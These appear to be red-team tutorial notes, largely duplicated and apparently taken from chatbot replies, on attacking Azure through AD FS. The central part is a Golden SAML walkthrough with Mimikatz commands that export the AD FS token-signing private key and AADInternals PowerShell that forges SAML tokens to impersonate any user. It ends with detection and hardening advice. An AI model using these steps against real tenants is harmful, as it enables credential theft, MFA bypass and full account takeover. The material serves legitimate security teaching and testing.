# Active Directory Federation Services

**🛡️ Active Directory Federation Services (AD FS) in Azure Penetration Testing**

**What It Is:**

- **Credentials are stored only on-premises**; no password hashes or
  credentials are synced to Azure AD.

- A **federated trust** is established between **Azure AD** and the
  on-premises **AD FS** server.

- Azure redirects authentication requests to the **on-prem AD FS
  endpoint**, which validates the user and issues a token.

------------------------------------------------------------------------

**🎯 How AD FS Helps in Azure Pentesting**

**✅ 1. On-Prem Compromise = Azure Access**

- Since authentication happens through AD FS, compromising on-prem
  credentials can grant access to **Azure apps and services**.

- The attacker must **target the on-prem AD FS login portal**, not Azure
  endpoints directly.

**✅ 2. Targeting the Federation Server**

- The **AD FS server** is a **high-value target**:

  - If compromised, allows issuance of **SAML tokens** to impersonate
    any user—including global admins.

  - Enables **cloud access without needing credentials** at all (Golden
    SAML attack).

**✅ 3. Password Attacks Must Hit AD FS**

- Password spraying or brute force attacks must be directed at the **AD
  FS web endpoint** (e.g.,
  https://adfs.corp.com/adfs/ls/IdpInitiatedSignOn.aspx).

- Azure will **redirect login attempts**, making the **AD FS logs** the
  source of truth for detection.

**✅ 4. Bypass Cloud MFA or Conditional Access**

- If MFA is enforced only at the **Azure level**, and not enforced
  **on-prem**, attackers can authenticate without triggering cloud MFA.

- Weak or missing policies on the AD FS side can lead to **MFA bypass**.

------------------------------------------------------------------------

**🧰 Common Pentester Techniques in AD FS Environments**

- **Recon:** Identify if AD FS is in use by analyzing login redirects or
  HTTP headers during login.

- **Credential Attacks:** Target AD FS login portal for password spray
  attacks.

- **Golden SAML Attack:** If the **AD FS private key** is compromised,
  craft valid SAML tokens to impersonate any user in Azure.

- **Token Replay:** Steal valid SAML tokens and reuse them to access
  Azure resources (if no proper token expiration enforcement exists).

------------------------------------------------------------------------

Would you like a step-by-step Golden SAML attack walkthrough or script
tailored for Azure AD FS environments?

Here is a **step-by-step walkthrough of a Golden SAML attack** in a
**federated Azure AD environment using AD FS**, tailored for red team or
Azure penetration testing scenarios.

------------------------------------------------------------------------

**🎯 Golden SAML Attack in Azure (via AD FS)**

Golden SAML is the SAML equivalent of Golden Ticket in Kerberos. It
allows an attacker to **forge authentication tokens** and **impersonate
any user**, including **Global Admins**, in Azure AD **without valid
credentials or MFA**—**if AD FS is federated and compromised**.

------------------------------------------------------------------------

**🔓 Requirements**

| **Item** | **Description** |
|----|----|
| 🔐 AD FS Signing Certificate | Private key used to sign SAML tokens |
| 💻 AD FS Server Access | Local admin or SYSTEM access |
| 🧑‍💻 Target User Info | UPN, roles, tenant ID of target Azure user |
| 🛠️ Tools | AADInternals, Fiddler/Browser, TokenTactics, Mimikatz (optional) |

------------------------------------------------------------------------

**🧭 Attack Steps**

**🔎 Step 1: Verify Federation is in Use**

- Use browser login to Azure (portal.azure.com) with a test username.

- If redirected to a different URL (e.g., https://adfs.corp.com) →
  Federation (AD FS) is active.

**🗝️ Step 2: Extract the AD FS Signing Certificate**

- On the AD FS server (Windows Server):

Get-AdfsCertificate –CertificateType Token-Signing \| Select-Object
Thumbprint

Get-AdfsCertificate –CertificateType Token-Signing \| Export-Certificate
-FilePath C:\token-signing.cer

- To export private key (local admin or SYSTEM needed):

  - Use certmgr.msc or PowerShell

  - Or dump with Mimikatz:

privilege::debug

token::elevate

crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
/store:My

crypto::export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My

**🧪 Step 3: Forge a SAML Assertion**

- Use AADInternals or TokenTactics to create a SAML token signed with
  the stolen certificate.

**✅ Using AADInternals:**

Install-Module AADInternals

Import-Module AADInternals

\# Set values

\$UPN = "victim@tenant.onmicrosoft.com"

\$AppID = "00000003-0000-0000-c000-000000000000" \# Microsoft Graph or
Office 365

\$TenantID = "your-tenant-id"

\$CertPath = "C:\path\to\adfs_private_key.pfx"

\# Create and inject SAML token

Invoke-AADIntSAMLToken -UserPrincipalName \$UPN -TenantID \$TenantID
-SigningCertPath \$CertPath -ClientId \$AppID

- This injects a forged token directly into a browser session, enabling
  access to Azure or O365 as the target user.

**🛂 Step 4: Access Azure Services**

- Now you can:

  - Log in as the user in portal.azure.com

  - Access Outlook mailboxes

  - Use Graph API or PowerShell with forged tokens

------------------------------------------------------------------------

**🕵️‍♂️ Red Team Notes**

| **Benefit** | **Description** |
|----|----|
| 🧨 Bypasses MFA | No MFA required; the SAML token is treated as trusted |
| 👥 Full impersonation | You can impersonate **any synced user**, even global admins |
| 🧭 No cloud logs | Azure sees only “successful” SAML auth |
| 📦 Long-term persistence | As long as the signing cert is valid (years), you can generate tokens |

------------------------------------------------------------------------

**🧹 Defensive Detection & Hardening (Blue Team Awareness)**

| **Area** | **Recommendation** |
|----|----|
| 🔐 Certificate Rotation | Rotate AD FS signing certs regularly |
| 🔎 Token Anomaly | Monitor unusual SAML token issuers or long durations |
| 🎯 AD FS Logging | Enable and forward AD FS logs (Event ID 1202, 1200) |
| 🚧 MFA Enforcement | Use **Azure Conditional Access** to enforce MFA even for federated logins |

------------------------------------------------------------------------

Would you like a Python version of this attack using Impacket or a lab
setup guide to safely test Golden SAML in a hybrid AD + Azure
environment?

# Active Directory Federation Services Pentest

**What it is?**
- **Credentials are stored only on-premises**; no password hashes or credentials are synced to Azure AD.
- A **federated trust** is established between **Azure AD** and the on-premises **AD FS** server.
- Azure redirects authentication requests to the **on-prem AD FS endpoint**, which validates the user and issues a token.

------------------------------------------------------------------------

## How AD FS Helps in Azure Pentesting

**✅ 1. On-Prem Compromise = Azure Access**

- Since authentication happens through AD FS, compromising on-prem credentials can grant access to **Azure apps and services**.
- The attacker must **target the on-prem AD FS login portal**, not Azure endpoints directly.

**✅ 2. Targeting the Federation Server**

- The **AD FS server** is a **high-value target**:
  - If compromised, allows issuance of **SAML tokens** to impersonate any user—including global admins.
  - Enables **cloud access without needing credentials** at all (Golden SAML attack).

**✅ 3. Password Attacks Must Hit AD FS**

- Password spraying or brute force attacks must be directed at the **AD FS web endpoint** (e.g., https://adfs.corp.com/adfs/ls/IdpInitiatedSignOn.aspx).
- Azure will **redirect login attempts**, making the **AD FS logs** the source of truth for detection.

**✅ 4. Bypass Cloud MFA or Conditional Access**

- If MFA is enforced only at the **Azure level**, and not enforced **on-prem**, attackers can authenticate without triggering cloud MFA.
- Weak or missing policies on the AD FS side can lead to **MFA bypass**.

------------------------------------------------------------------------

**🧰 Common Pentester Techniques in AD FS Environments**

- **Recon:** Identify if AD FS is in use by analyzing login redirects or HTTP headers during login.
- **Credential Attacks:** Target AD FS login portal for password spray attacks.
- **Golden SAML Attack:** If the **AD FS private key** is compromised, craft valid SAML tokens to impersonate any user in Azure.
- **Token Replay:** Steal valid SAML tokens and reuse them to access Azure resources (if no proper token expiration enforcement exists).

------------------------------------------------------------------------

## step-by-step walkthrough of a Golden SAML attack on Azure through ADFS

Golden SAML is the SAML equivalent of Golden Ticket in Kerberos. It allows an attacker to **forge authentication tokens** and **impersonate any user**, including **Global Admins**, in Azure AD **without valid credentials or MFA**—**if AD FS is federated and compromised**.

------------------------------------------------------------------------

**🔓 Requirements**

| **Item** | **Description** |
|----|----|
| 🔐 AD FS Signing Certificate | Private key used to sign SAML tokens |
| 💻 AD FS Server Access | Local admin or SYSTEM access |
| 🧑‍💻 Target User Info | UPN, roles, tenant ID of target Azure user |
| 🛠️ Tools | AADInternals, Fiddler/Browser, TokenTactics, Mimikatz (optional) |

------------------------------------------------------------------------

**🧭 Attack Steps**

**🔎 Step 1: Verify Federation is in Use**

- Use browser login to Azure (portal.azure.com) with a test username.
- If redirected to a different URL (e.g., https://adfs.corp.com) → Federation (AD FS) is active.

**🗝️ Step 2: Extract the AD FS Signing Certificate**

- On the AD FS server (Windows Server):
  - `Get-AdfsCertificate –CertificateType Token-Signing \| Select-Object Thumbprint`
  - Get-AdfsCertificate –CertificateType Token-Signing \| Export-Certificate -FilePath C:\token-signing.cer
- To export private key (local admin or SYSTEM needed):
  - Use certmgr.msc or PowerShell
  - Or dump with Mimikatz:

privilege::debug
token::elevate

crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My
crypto::export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My

**🧪 Step 3: Forge a SAML Assertion**

- Use AADInternals or TokenTactics to create a SAML token signed with the stolen certificate.

**✅ Using AADInternals:**

```
Install-Module AADInternals
Import-Module AADInternals
\# Set values
\$UPN = "victim@tenant.onmicrosoft.com"
\$AppID = "00000003-0000-0000-c000-000000000000" \# Microsoft Graph or Office 365
\$TenantID = "your-tenant-id"
\$CertPath = "C:\path\to\adfs_private_key.pfx"
\# Create and inject SAML token
Invoke-AADIntSAMLToken -UserPrincipalName \$UPN -TenantID \$TenantID -SigningCertPath \$CertPath -ClientId \$AppID
```

- This injects a forged token directly into a browser session, enabling access to Azure or O365 as the target user.

**🛂 Step 4: Access Azure Services**

- Now you can:
  - Log in as the user in portal.azure.com
  - Access Outlook mailboxes
  - Use Graph API or PowerShell with forged tokens

------------------------------------------------------------------------

**🕵️‍♂️ Red Team Notes**

| **Benefit** | **Description** |
|----|----|
| 🧨 Bypasses MFA | No MFA required; the SAML token is treated as trusted |
| 👥 Full impersonation | You can impersonate **any synced user**, even global admins |
| 🧭 No cloud logs | Azure sees only “successful” SAML auth |
| 📦 Long-term persistence | As long as the signing cert is valid (years), you can generate tokens |

------------------------------------------------------------------------

**🧹 Defensive Detection & Hardening (Blue Team Awareness)**

| **Area** | **Recommendation** |
|----|----|
| 🔐 Certificate Rotation | Rotate AD FS signing certs regularly |
| 🔎 Token Anomaly | Monitor unusual SAML token issuers or long durations |
| 🎯 AD FS Logging | Enable and forward AD FS logs (Event ID 1202, 1200) |
| 🚧 MFA Enforcement | Use **Azure Conditional Access** to enforce MFA even for federated logins |

